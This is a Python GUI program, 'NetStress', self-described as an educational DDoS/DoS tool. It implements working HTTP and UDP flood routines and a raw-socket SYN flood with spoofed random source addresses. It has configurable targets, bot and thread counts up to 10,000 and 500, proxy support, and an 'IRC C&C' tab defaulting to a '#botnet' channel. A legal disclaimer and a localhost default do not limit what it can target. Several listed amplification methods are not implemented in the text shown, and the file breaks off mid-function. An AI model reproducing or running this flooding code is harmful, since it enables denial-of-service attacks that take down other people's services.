import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, Canvas
import threading
import time
import random
import socket
import os
import sys
import math
import requests
import dns.resolver
from datetime import datetime
import json
import subprocess

# Safety warnings and educational context
DISCLAIMER = """
WARNING: This tool is for EDUCATIONAL PURPOSES ONLY.

Using denial-of-service attacks against systems you do not own or have explicit permission to test is:
- ILLEGAL in most countries
- UNETHICAL
- POTENTIALLY DAMAGING

By using this tool, you agree:
1. You will only test systems you own or have explicit written permission to test
2. You understand the legal consequences of misuse
3. You accept all responsibility for your actions

This tool includes safety features:
- Default target is 127.0.0.1 (your own computer)
- Attack intensity is limited by default
- All attacks include automatic time limits
"""

class PyNetStress:
    def __init__(self, root):
        self.root = root
        self.root.title("NetStress - Educational DDoS/DOS Tool")
        self.root.geometry("1400x900")
        self.root.configure(bg='#0f1a26')
        
        # Load and set icon
        try:
            self.root.iconbitmap(self.resource_path("icon.ico"))
        except:
            pass
        
        # Display disclaimer
        if not self.check_agreement():
            self.show_disclaimer()
        
        self.running = False
        self.attack_thread = None
        self.attack_mode = "DDoS"
        self.bot_count = 100
        self.thread_count = 50
        self.method = "HTTP Flood"
        self.target_ip = "127.0.0.1"
        self.target_url = ""
        self.target_port = 80
        self.duration = 30
        self.use_proxies = False
        self.proxies = []
        self.status_indicator = "gray"
        self.logs = []
        self.attack_stats = {
            "packets_sent": 0,
            "requests_sent": 0,
            "start_time": 0,
            "active_bots": 0
        }
        self.animation_items = []
        self.packet_trails = []
        
        # Create GUI
        self.create_gui()
        self.update_status_indicator()
        
    def resource_path(self, relative_path):
        try:
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")
        return os.path.join(base_path, relative_path)
    
    def check_agreement(self):
        try:
            with open("agreement.json", "r") as f:
                data = json.load(f)
                return data.get("agreed", False)
        except:
            return False
    
    def save_agreement(self):
        with open("agreement.json", "w") as f:
            json.dump({"agreed": True}, f)
    
    def show_disclaimer(self):
        disclaimer_window = tk.Toplevel(self.root)
        disclaimer_window.title("IMPORTANT LEGAL DISCLAIMER")
        disclaimer_window.geometry("800x600")
        disclaimer_window.resizable(False, False)
        disclaimer_window.attributes("-topmost", True)
        disclaimer_window.grab_set()
        
        frame = ttk.Frame(disclaimer_window, padding=20)
        frame.pack(fill='both', expand=True)
        
        ttk.Label(frame, text="NETSTRESS - LEGAL AGREEMENT", font=("Arial", 16, "bold")).pack(pady=10)
        
        text = scrolledtext.ScrolledText(frame, wrap=tk.WORD, width=90, height=20)
        text.insert(tk.INSERT, DISCLAIMER)
        text.configure(state='disabled', bg='#f0f0f0', font=("Arial", 10))
        text.pack(pady=10)
        
        ttk.Label(frame, text="Do you agree to use this tool only for legal, educational purposes?", 
                 font=("Arial", 10)).pack(pady=5)
        
        agree_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(frame, text="I agree to the terms above", variable=agree_var).pack(pady=5)
        
        def proceed():
            if agree_var.get():
                self.save_agreement()
                disclaimer_window.destroy()
            else:
                messagebox.showerror("Agreement Required", "You must agree to the terms to use this tool")
        
        ttk.Button(frame, text="PROCEED", command=proceed).pack(pady=10)
        
        disclaimer_window.protocol("WM_DELETE_WINDOW", lambda: sys.exit(0))
        disclaimer_window.mainloop()
    
    def create_gui(self):
        # Create main notebook (tabs)
        style = ttk.Style()
        style.configure("TNotebook", background='#0c151d', borderwidth=0)
        style.configure("TNotebook.Tab", background='#0c151d', foreground='white', padding=[10, 5])
        style.map("TNotebook.Tab", background=[("selected", '#1a2d3d')])
        
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Attack Tab
        attack_frame = ttk.Frame(notebook, padding=10)
        notebook.add(attack_frame, text='DDoS Attack')
        self.create_attack_tab(attack_frame)
        
        # Recon Tab
        recon_frame = ttk.Frame(notebook, padding=10)
        notebook.add(recon_frame, text='Reconnaissance')
        self.create_recon_tab(recon_frame)
        
        # IRC Tab
        irc_frame = ttk.Frame(notebook, padding=10)
        notebook.add(irc_frame, text='IRC C&C')
        self.create_irc_tab(irc_frame)
        
        # Methods Tab
        methods_frame = ttk.Frame(notebook, padding=10)
        notebook.add(methods_frame, text='Attack Methods')
        self.create_methods_tab(methods_frame)
        
        # Settings Tab
        settings_frame = ttk.Frame(notebook, padding=10)
        notebook.add(settings_frame, text='Settings')
        self.create_settings_tab(settings_frame)
        
        # Status Bar
        self.status_var = tk.StringVar()
        self.status_var.set("Status: Ready | Bots: 0 | Threads: 0 | Mode: DDoS | Target: 127.0.0.1")
        status_bar = ttk.Label(self.root, textvariable=self.status_var, relief='sunken', anchor='w', 
                             background='#1a2d3d', foreground='white')
        status_bar.pack(side='bottom', fill='x')
        
        # Status indicator
        self.status_canvas = Canvas(self.root, width=20, height=20, bg='#0f1a26', highlightthickness=0)
        self.status_canvas.pack(side='bottom', anchor='e', padx=10, pady=5)
        self.status_indicator_id = self.status_canvas.create_oval(2, 2, 18, 18, fill='gray')
        ttk.Label(self.root, text="Target Status:", background='#0f1a26', foreground='white').pack(side='bottom', anchor='e', padx=10, pady=5)
    
    def create_attack_tab(self, parent):
        parent.configure(style='TFrame')
        
        # Left panel - Configuration
        config_frame = ttk.LabelFrame(parent, text="Attack Configuration", padding=15)
        config_frame.pack(side='left', fill='y', padx=10, pady=10)
        
        # Target Section
        target_frame = ttk.Frame(config_frame)
        target_frame.pack(fill='x', pady=5)
        
        ttk.Label(target_frame, text="Target URL:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.target_entry = ttk.Entry(target_frame, width=30)
        self.target_entry.grid(row=0, column=1, padx=5, pady=5, sticky='we')
        self.target_entry.insert(0, "http://127.0.0.1")
        self.target_entry.bind("<FocusOut>", self.resolve_target)
        
        ttk.Label(target_frame, text="Resolved IP:").grid(row=1, column=0, padx=5, pady=5, sticky='w')
        self.ip_entry = ttk.Entry(target_frame, width=30)
        self.ip_entry.grid(row=1, column=1, padx=5, pady=5, sticky='we')
        self.ip_entry.insert(0, "127.0.0.1")
        
        ttk.Label(target_frame, text="Port:").grid(row=2, column=0, padx=5, pady=5, sticky='w')
        self.port_entry = ttk.Entry(target_frame, width=10)
        self.port_entry.grid(row=2, column=1, padx=5, pady=5, sticky='w')
        self.port_entry.insert(0, "80")
        
        # Attack Mode Section
        mode_frame = ttk.LabelFrame(config_frame, text="Attack Mode", padding=10)
        mode_frame.pack(fill='x', pady=10)
        
        self.mode_var = tk.StringVar(value="DDoS")
        ttk.Radiobutton(mode_frame, text="Distributed Denial of Service (DDoS)", 
                        variable=self.mode_var, value="DDoS", command=self.update_mode).pack(side='left', padx=10)
        ttk.Radiobutton(mode_frame, text="Denial of Service (DoS)", 
                        variable=self.mode_var, value="DoS", command=self.update_mode).pack(side='left', padx=10)
        
        # Bot Configuration
        bot_frame = ttk.LabelFrame(config_frame, text="Bot Configuration", padding=10)
        bot_frame.pack(fill='x', pady=5)
        
        ttk.Label(bot_frame, text="Number of Bots:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.bot_slider = ttk.Scale(bot_frame, from_=1, to=10000, orient='horizontal', 
                                   command=lambda v: self.bot_var.set(int(float(v))))
        self.bot_slider.grid(row=0, column=1, padx=5, pady=5, sticky='we')
        self.bot_var = tk.IntVar(value=100)
        self.bot_entry = ttk.Entry(bot_frame, textvariable=self.bot_var, width=10)
        self.bot_entry.grid(row=0, column=2, padx=5, pady=5, sticky='w')
        
        ttk.Label(bot_frame, text="Threads per Bot:").grid(row=1, column=0, padx=5, pady=5, sticky='w')
        self.thread_slider = ttk.Scale(bot_frame, from_=1, to=500, orient='horizontal', 
                                      command=lambda v: self.thread_var.set(int(float(v))))
        self.thread_slider.grid(row=1, column=1, padx=5, pady=5, sticky='we')
        self.thread_var = tk.IntVar(value=50)
        self.thread_entry = ttk.Entry(bot_frame, textvariable=self.thread_var, width=10)
        self.thread_entry.grid(row=1, column=2, padx=5, pady=5, sticky='w')
        
        # Attack Parameters
        param_frame = ttk.LabelFrame(config_frame, text="Attack Parameters", padding=10)
        param_frame.pack(fill='x', pady=5)
        
        ttk.Label(param_frame, text="Attack Method:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.method_var = tk.StringVar()
        self.method_combo = ttk.Combobox(param_frame, textvariable=self.method_var, width=20)
        self.method_combo['values'] = ('HTTP Flood', 'UDP Flood', 'SYN Flood', 'ICMP Flood', 
                                      'Slowloris', 'DNS Amplification', 'SSDP', 'NTP Amplification',
                                      'Memcached', 'Ping of Death', 'RUDY', 'HTTP Killer')
        self.method_combo.current(0)
        self.method_combo.grid(row=0, column=1, padx=5, pady=5, sticky='w')
        
        ttk.Label(param_frame, text="Duration (seconds):").grid(row=0, column=2, padx=5, pady=5, sticky='w')
        self.duration_var = tk.IntVar(value=30)
        self.duration_entry = ttk.Entry(param_frame, textvariable=self.duration_var, width=10)
        self.duration_entry.grid(row=0, column=3, padx=5, pady=5, sticky='w')
        
        self.proxy_var = tk.BooleanVar(value=False)
        self.proxy_check = ttk.Checkbutton(param_frame, text="Use Proxies", variable=self.proxy_var,
                                          command=self.toggle_proxy)
        self.proxy_check.grid(row=1, column=0, padx=5, pady=5, sticky='w')
        
        self.proxy_button = ttk.Button(param_frame, text="Load Proxy List", state='disabled', 
                                     command=self.load_proxy_file)
        self.proxy_button.grid(row=1, column=1, padx=5, pady=5, sticky='w')
        
        # Control Buttons
        control_frame = ttk.Frame(config_frame)
        control_frame.pack(fill='x', pady=15)
        
        self.start_button = ttk.Button(control_frame, text="Start Attack", width=15, command=self.start_attack)
        self.start_button.pack(side='left', padx=10)
        
        self.stop_button = ttk.Button(control_frame, text="Stop Attack", width=15, state='disabled', command=self.stop_attack)
        self.stop_button.pack(side='left', padx=10)
        
        self.reset_button = ttk.Button(control_frame, text="Reset", width=15, command=self.reset)
        self.reset_button.pack(side='right', padx=10)
        
        # Attack progress
        self.progress_var = tk.DoubleVar(value=0.0)
        self.progress = ttk.Progressbar(config_frame, variable=self.progress_var, maximum=100, 
                                       mode='determinate', length=300)
        self.progress.pack(fill='x', pady=10)
        
        # Right panel - Visualization
        vis_frame = ttk.LabelFrame(parent, text="Attack Visualization", padding=10)
        vis_frame.pack(side='right', fill='both', expand=True, padx=10, pady=10)
        
        self.canvas = Canvas(vis_frame, bg='#0a111a', highlightthickness=0)
        self.canvas.pack(fill='both', expand=True)
        self.create_visualization()
        
    def create_recon_tab(self, parent):
        # Target Information
        info_frame = ttk.LabelFrame(parent, text="Target Information", padding=10)
        info_frame.pack(fill='x', padx=10, pady=5)
        
        ttk.Label(info_frame, text="Enter Domain or IP:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.recon_entry = ttk.Entry(info_frame, width=40)
        self.recon_entry.grid(row=0, column=1, padx=5, pady=5, sticky='we')
        self.recon_entry.insert(0, "example.com")
        
        ttk.Button(info_frame, text="Gather Information", command=self.start_recon).grid(row=0, column=2, padx=10)
        
        # Results display
        result_frame = ttk.LabelFrame(parent, text="Reconnaissance Results", padding=10)
        result_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        self.recon_text = scrolledtext.ScrolledText(result_frame, wrap=tk.WORD, width=80, height=20,
                                                  bg='#1a2d3d', fg='#ffffff', insertbackground='white')
        self.recon_text.pack(fill='both', expand=True, padx=5, pady=5)
        self.recon_text.insert(tk.END, "Enter a domain or IP address and click 'Gather Information'")
        self.recon_text.configure(state='disabled')
        
    def create_irc_tab(self, parent):
        # IRC Configuration
        config_frame = ttk.LabelFrame(parent, text="IRC Configuration", padding=10)
        config_frame.pack(fill='x', padx=10, pady=5)
        
        ttk.Label(config_frame, text="Server:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.irc_server = ttk.Entry(config_frame, width=30)
        self.irc_server.grid(row=0, column=1, padx=5, pady=5, sticky='we')
        self.irc_server.insert(0, "irc.example.com")
        
        ttk.Label(config_frame, text="Port:").grid(row=0, column=2, padx=5, pady=5, sticky='w')
        self.irc_port = ttk.Entry(config_frame, width=10)
        self.irc_port.grid(row=0, column=3, padx=5, pady=5, sticky='w')
        self.irc_port.insert(0, "6667")
        
        ttk.Label(config_frame, text="Channel:").grid(row=1, column=0, padx=5, pady=5, sticky='w')
        self.irc_channel = ttk.Entry(config_frame, width=30)
        self.irc_channel.grid(row=1, column=1, padx=5, pady=5, sticky='we')
        self.irc_channel.insert(0, "#botnet")
        
        ttk.Label(config_frame, text="Bot Prefix:").grid(row=1, column=2, padx=5, pady=5, sticky='w')
        self.irc_prefix = ttk.Entry(config_frame, width=10)
        self.irc_prefix.grid(row=1, column=3, padx=5, pady=5, sticky='w')
        self.irc_prefix.insert(0, "bot")
        
        # Control buttons
        btn_frame = ttk.Frame(config_frame)
        btn_frame.grid(row=2, column=0, columnspan=4, pady=10)
        
        ttk.Button(btn_frame, text="Connect", command=self.connect_irc).pack(side='left', padx=5)
        ttk.Button(btn_frame, text="Disconnect", command=self.disconnect_irc).pack(side='left', padx=5)
        ttk.Button(btn_frame, text="Send Command", command=self.send_irc_command).pack(side='left', padx=5)
        
        # IRC Log
        log_frame = ttk.LabelFrame(parent, text="IRC Communication", padding=10)
        log_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        self.irc_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, width=80, height=20,
                                                bg='#1a2d3d', fg='#ffffff', insertbackground='white')
        self.irc_text.pack(fill='both', expand=True, padx=5, pady=5)
        self.irc_text.insert(tk.END, "Not connected to IRC server")
        self.irc_text.configure(state='disabled')
    
    def create_methods_tab(self, parent):
        # Method selection and description
        method_frame = ttk.LabelFrame(parent, text="Select Attack Method", padding=10)
        method_frame.pack(fill='x', padx=10, pady=5)
        
        self.method_list = ttk.Combobox(method_frame, width=40)
        self.method_list['values'] = ('HTTP Flood', 'UDP Flood', 'SYN Flood', 'ICMP Flood', 
                                    'Slowloris', 'DNS Amplification', 'SSDP', 'NTP Amplification',
                                    'Memcached', 'Ping of Death', 'RUDY', 'HTTP Killer')
        self.method_list.current(0)
        self.method_list.pack(side='left', padx=5, pady=5)
        
        # Method details
        details_frame = ttk.LabelFrame(parent, text="Method Details", padding=10)
        details_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        self.method_text = scrolledtext.ScrolledText(details_frame, wrap=tk.WORD, width=80, height=20,
                                                   bg='#1a2d3d', fg='#ffffff', insertbackground='white')
        self.method_text.pack(fill='both', expand=True, padx=5, pady=5)
        
        # Load method descriptions
        self.method_descriptions = {
            "HTTP Flood": "Sends a flood of HTTP requests to overwhelm a web server. This is the most common application layer attack.",
            "UDP Flood": "Floods the target with UDP packets to random ports, causing the host to check for applications and reply with ICMP packets.",
            "SYN Flood": "Exploits the TCP handshake by sending a flood of SYN packets and never completing the connection.",
            "ICMP Flood": "Overwhelms the target with ICMP Echo Request (ping) packets, consuming bandwidth and resources.",
            "Slowloris": "Opens multiple connections to the target and keeps them open by sending partial HTTP requests.",
            "DNS Amplification": "Exploits DNS servers to amplify attack traffic by sending small queries that return large responses.",
            "SSDP": "Uses Simple Service Discovery Protocol to amplify attack traffic through vulnerable UPnP devices.",
            "NTP Amplification": "Exploits Network Time Protocol servers to amplify attack traffic.",
            "Memcached": "Abuses unprotected Memcached servers to amplify attack traffic.",
            "Ping of Death": "Sends malformed or oversized ping packets to crash systems.",
            "RUDY": "R-U-Dead-Yet attack that sends long-form field submissions to tie up server resources.",
            "HTTP Killer": "High-intensity HTTP attack that floods the target with multiple request types."
        }
        
        self.update_method_description()
        self.method_list.bind("<<ComboboxSelected>>", lambda e: self.update_method_description())
    
    def create_settings_tab(self, parent):
        # General settings
        general_frame = ttk.LabelFrame(parent, text="General Settings", padding=10)
        general_frame.pack(fill='x', padx=10, pady=5)
        
        ttk.Label(general_frame, text="Theme:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.theme_var = tk.StringVar(value="Dark")
        theme_combo = ttk.Combobox(general_frame, textvariable=self.theme_var, width=15)
        theme_combo['values'] = ('Dark', 'Light', 'Blue', 'Hacker')
        theme_combo.grid(row=0, column=1, padx=5, pady=5, sticky='w')
        
        # Animation settings
        anim_frame = ttk.LabelFrame(parent, text="Animation Settings", padding=10)
        anim_frame.pack(fill='x', padx=10, pady=5)
        
        self.anim_speed_var = tk.IntVar(value=30)
        ttk.Label(anim_frame, text="Animation Speed:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        ttk.Scale(anim_frame, from_=10, to=100, orient='horizontal', 
                 variable=self.anim_speed_var).grid(row=0, column=1, padx=5, pady=5, sticky='we')
        
        # Safety settings
        safety_frame = ttk.LabelFrame(parent, text="Safety Settings", padding=10)
        safety_frame.pack(fill='x', padx=10, pady=5)
        
        self.max_bots_var = tk.IntVar(value=10000)
        ttk.Label(safety_frame, text="Max Bots:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        ttk.Entry(safety_frame, textvariable=self.max_bots_var, width=10).grid(row=0, column=1, padx=5, pady=5, sticky='w')
        
        self.max_threads_var = tk.IntVar(value=500)
        ttk.Label(safety_frame, text="Max Threads:").grid(row=0, column=2, padx=5, pady=5, sticky='w')
        ttk.Entry(safety_frame, textvariable=self.max_threads_var, width=10).grid(row=0, column=3, padx=5, pady=5, sticky='w')
        
        self.max_duration_var = tk.IntVar(value=300)
        ttk.Label(safety_frame, text="Max Duration (s):").grid(row=1, column=0, padx=5, pady=5, sticky='w')
        ttk.Entry(safety_frame, textvariable=self.max_duration_var, width=10).grid(row=1, column=1, padx=5, pady=5, sticky='w')
        
        # Save settings
        save_frame = ttk.Frame(parent)
        save_frame.pack(fill='x', padx=10, pady=10)
        
        ttk.Button(save_frame, text="Apply Settings", command=self.apply_settings).pack(side='left', padx=5)
        ttk.Button(save_frame, text="Restore Defaults", command=self.restore_defaults).pack(side='left', padx=5)
    
    def update_status_indicator(self):
        """Update target status indicator based on response time"""
        try:
            # Check target status
            target = self.target_entry.get().replace("http://", "").replace("https://", "")
            start_time = time.time()
            socket.create_connection((target, int(self.port_entry.get())), timeout=2)
            response_time = (time.time() - start_time) * 1000
            
            if response_time < 100:
                color = "green"
                status = "Operational"
            elif response_time < 1000:
                color = "orange"
                status = "Slow"
            else:
                color = "red"
                status = "Unresponsive"
        except:
            color = "red"
            status = "Offline"
        
        self.status_indicator = color
        self.status_canvas.itemconfig(self.status_indicator_id, fill=color)
        self.status_var.set(f"Status: Ready | Target: {self.target_ip}:{self.target_port} | Status: {status}")
        
        # Schedule next check
        if not self.running:
            self.root.after(5000, self.update_status_indicator)
    
    def resolve_target(self, event=None):
        """Resolve domain to IP address"""
        url = self.target_entry.get()
        if not url.startswith("http"):
            url = "http://" + url
        
        try:
            # Extract domain
            domain = url.split("//")[-1].split("/")[0]
            self.target_url = domain
            
            # Resolve to IP
            self.target_ip = socket.gethostbyname(domain)
            self.ip_entry.delete(0, tk.END)
            self.ip_entry.insert(0, self.target_ip)
            
            # Update status
            self.update_status_indicator()
        except Exception as e:
            self.log(f"Resolution error: {str(e)}", "ERROR")
    
    def update_mode(self):
        self.attack_mode = self.mode_var.get()
        if self.attack_mode == "DoS":
            self.bot_var.set(1)
            self.bot_slider.config(to=1)
            self.bot_entry.config(state='disabled')
        else:
            self.bot_slider.config(to=self.max_bots_var.get())
            self.bot_entry.config(state='normal')
    
    def toggle_proxy(self):
        self.use_proxies = self.proxy_var.get()
        self.proxy_button.config(state='normal' if self.use_proxies else 'disabled')
    
    def load_proxy_file(self):
        file_path = filedialog.askopenfilename(title="Select Proxy List", 
                                              filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    self.proxies = [line.strip() for line in f.readlines() if line.strip()]
                self.log(f"Loaded {len(self.proxies)} proxies from {file_path}")
            except Exception as e:
                self.log(f"Failed to load proxies: {str(e)}", "ERROR")
        else:
            self.proxy_var.set(False)
            self.proxy_button.config(state='disabled')
    
    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        log_entry = f"[{timestamp}] [{level}] {message}"
        self.logs.append(log_entry)
        
        # Update logs tab if visible
        self.log_text.configure(state='normal')
        self.log_text.insert(tk.END, log_entry + "\n")
        self.log_text.configure(state='disabled')
        self.log_text.see(tk.END)
    
    def start_attack(self):
        if self.running:
            return
            
        # Get parameters
        try:
            self.target_ip = self.ip_entry.get()
            self.target_port = int(self.port_entry.get())
            self.bot_count = min(self.bot_var.get(), self.max_bots_var.get())
            self.thread_count = min(self.thread_var.get(), self.max_threads_var.get())
            self.duration = min(self.duration_var.get(), self.max_duration_var.get())
            self.method = self.method_var.get()
        except ValueError:
            messagebox.showerror("Input Error", "Please enter valid numeric values")
            return
            
        if self.attack_mode == "DoS":
            self.bot_count = 1
            
        # Update UI
        self.start_button.config(state='disabled')
        self.stop_button.config(state='normal')
        self.running = True
        self.attack_stats = {
            "packets_sent": 0,
            "requests_sent": 0,
            "start_time": time.time(),
            "active_bots": self.bot_count
        }
        self.progress_var.set(0)
        
        # Start attack in a separate thread
        self.attack_thread = threading.Thread(target=self.launch_attack, daemon=True)
        self.attack_thread.start()
        
        # Start updating stats
        self.update_stats()
        
        # Start animation
        self.animate_attack()
        
        # Log the attack start
        self.log(f"Starting {self.attack_mode} attack on {self.target_ip}:{self.target_port}")
        self.log(f"Method: {self.method}, Bots: {self.bot_count}, Threads: {self.thread_count}")
    
    def launch_attack(self):
        """Launch the actual attack based on selected method"""
        try:
            if self.method == "HTTP Flood":
                self.http_flood()
            elif self.method == "UDP Flood":
                self.udp_flood()
            elif self.method == "SYN Flood":
                self.syn_flood()
            elif self.method == "ICMP Flood":
                self.icmp_flood()
            elif self.method == "Slowloris":
                self.slowloris()
            elif self.method == "DNS Amplification":
                self.dns_amplification()
            elif self.method == "SSDP":
                self.ssdp_attack()
            elif self.method == "NTP Amplification":
                self.ntp_amplification()
            elif self.method == "Memcached":
                self.memcached_attack()
            elif self.method == "Ping of Death":
                self.ping_of_death()
            elif self.method == "RUDY":
                self.rudy_attack()
            elif self.method == "HTTP Killer":
                self.http_killer_attack()
        except Exception as e:
            self.log(f"Attack error: {str(e)}", "ERROR")
        finally:
            self.running = False
            self.root.after(0, self.stop_attack)
    
    def http_flood(self):
        """HTTP Flood attack implementation"""
        self.log("Starting HTTP Flood attack")
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
        ]
        
        paths = ['/', '/index.html', '/api/data', '/images/logo.png', '/videos/demo.mp4']
        methods = ['GET', 'POST', 'HEAD']
        
        start_time = time.time()
        while self.running and time.time() - start_time < self.duration:
            try:
                # Create a new socket for each request
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((self.target_ip, self.target_port))
                
                # Build HTTP request
                method = random.choice(methods)
                path = random.choice(paths)
                host = self.target_url if self.target_url else self.target_ip
                
                request = (
                    f"{method} {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random.choice(user_agents)}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                
                s.send(request.encode())
                self.attack_stats["requests_sent"] += 1
                time.sleep(0.01)  # Prevent overwhelming local machine
            except:
                pass
            finally:
                try:
                    s.close()
                except:
                    pass
    
    def udp_flood(self):
        """UDP Flood attack implementation"""
        self.log("Starting UDP Flood attack")
        start_time = time.time()
        
        while self.running and time.time() - start_time < self.duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # Generate random payload
                payload = os.urandom(random.randint(64, 1024))
                
                # Send to random ports
                port = random.randint(1, 65535)
                s.sendto(payload, (self.target_ip, port))
                self.attack_stats["packets_sent"] += 1
                
                # Close socket
                s.close()
            except:
                pass
    
    def syn_flood(self):
        """SYN Flood attack implementation"""
        self.log("Starting SYN Flood attack")
        start_time = time.time()
        
        while self.running and time.time() - start_time < self.duration:
            try:
                # Create raw socket
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                
                # Set IP header
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Generate random source IP and port
                src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                src_port = random.randint(1024, 65535)
                
                # Build TCP SYN packet
                packet = self.build_syn_packet(src_ip, self.target_ip, src_port, self.target_port)
                s.sendto(packet, (self.target_ip, 0))
                self.attack_stats["packets_sent"] += 1
            except:
                pass
    
    def build_syn_packet(self, src_ip, dest_ip, src_port, dest_port):
        """Build a TCP SYN packet"""
        # IP header
        ip_ver = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = 40  # 20 bytes IP + 20 bytes TCP
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dest_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        ip_header = bytes([
            ip_ihl_ver, ip_tos, 
            (ip_tot_len >> 8) & 0xFF, ip_tot_len & 0xFF,
            (ip_id >> 8) & 0xFF, ip_id & 0xFF,
            (ip_frag_off >> 8) & 0xFF, ip_frag_off & 0xFF,
            ip_ttl, ip_proto, 
            (ip_check >> 8) & 0xFF, ip_check & 0xFF,
        ]) + ip_saddr + ip_daddr
        
        # TCP header
        tcp_source = src_port
        tcp_dest = dest_port
        tcp_seq = random.randint(0, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5  # Data offset: 5 * 4 = 20 bytes
        tcp_flags = 0x02  # SYN flag
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4)
        tcp_flags = tcp_flags
        
        tcp_header = bytes([
            (tcp_source >> 8) & 0xFF, tcp_source & 0xFF,
            (tcp_dest >> 8) & 0xFF, tcp_dest & 0xFF,
            (tcp_seq >> 24) & 0xFF, (tcp_seq >> 16) & 0xFF, (tcp_seq >> 8) & 0xFF, tcp_seq & 0xFF,
            (tcp_ack_seq >> 24) & 0xFF, (tcp_ack_seq >> 16) & 0xFF, (tcp_ack_seq >> 8) & 0xFF, tcp_ack_seq & 0xFF,
            tcp_offset_res, tcp_flags,
            (tcp_window >> 8) & 0xFF, tcp_window & 0xFF,
            (tcp_check >> 8) & 0xFF, tcp_check & 0xFF,
            (tcp_urg_ptr >> 8) & 0xFF, tcp_urg_ptr & 0xFF
        ])
        
        # Pseudo header for checksum
        pseudo_header = ip_saddr + ip_daddr + bytes([0, ip_proto]) + socket.htons(len(tcp_header))
        
        # TCP checksum calculation
        tcp_check = self.calculate_checksum(pseudo_header + tcp_header)
        tcp_header = tcp_header[:16] + bytes([(tcp_check >> 8) & 0xFF, tcp_check & 0xFF]) + tcp_header[18:]
        
        return ip_header + tcp_header
    
    def calculate_checksum(self, data):
        """Calculate checksum for the given data"""
        if len(data) % 2:
            data += b'\x00'
            
        total = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            total += word
            total = (total & 0xffff) + (total >> 16)
            
        return ~total & 0xffff
    
    def stop_attack(self):
        self.running = False
        self.start_button.config(state='normal')
        self.stop_button.config(state='disabled')
        self.log("Attack stopped")
        self.status_var.set(f"Status: Stopped | Target: {self.target_ip}:{self.target_port}")
        self.update_status_indicator()
    
    def reset(self):
        self.stop_attack()
        self.bot_var.set(100)
        self.thread_var.set(50)
        self.duration_var.set(30)
        self.method_var.set("HTTP Flood")
        self.mode_var.set("DDoS")
        self.target_entry.delete(0, tk.END)
        self.target_entry.insert(0, "http://127.0.0.1")
        self.ip_entry.delete(0, tk.END)
        self.ip_entry.insert(0, "127.0.0.1")
        self.port_entry.delete(0, tk.END)
        self.port_entry.insert(0, "80")
        self.log_text.configure(state='normal')
        self.log_text.delete(1.0, tk.END)
        self.log_text.configure(state='disabled')
        self.attack_stats = {
            "packets_sent": 0,
            "requests_sent": 0,
            "start_time": 0,
            "active_bots": 0
        }
        self.progress_var.set(0)
        self.status_var.set("Status: Ready | Bots: 0 | Threads: 0 | Mode: DDoS | Target: 127.0.0.1")
        self.update_status_indicator()
    
    def update_stats(self):
        if not self.running:
            return
            
        duration = time.time() - self.attack_stats["start_time"]
        packets = self.attack_stats["packets_sent"]
        requests = self.attack_stats["requests_sent"]
        bots_active = self.attack_stats["active_bots"]
        threads_active = self.thread_count * bots_active
        progress = min(100, (duration / self.duration) * 100)
        self.progress_var.set(progress)
        
        stats = f"Attack Duration: {duration:.1f}s\n"
        stats += f"Total Packets Sent: {packets}\n"
        stats += f"Total Requests Sent: {requests}\n"
        stats += f"Packets/Second: {packets/duration:.1f}\n" if duration > 0 else ""
        stats += f"Active Bots: {bots_active}\n"
        stats += f"Active Threads: {threads_active}\n"
        stats += f"Attack Method: {self.method}\n"
        stats += f"Target: {self.target_ip}:{self.target_port}"
        
        # Update status bar
        self.status_var.set(f"Status: Attacking | Bots: {bots_active} | Threads: {threads_active} | Mode: {self.attack_mode} | Target: {self.target_ip}:{self.target_port}")
        
        if self.running:
            self.root.after(1000, self.update_stats)
    
    def create_visualization(self):
        """Create the initial visualization"""
        self.canvas.delete("all")
        self.animation_items = []
        self.packet_trails = []
        
        # Create target server
        server_x, server_y = 400, 300
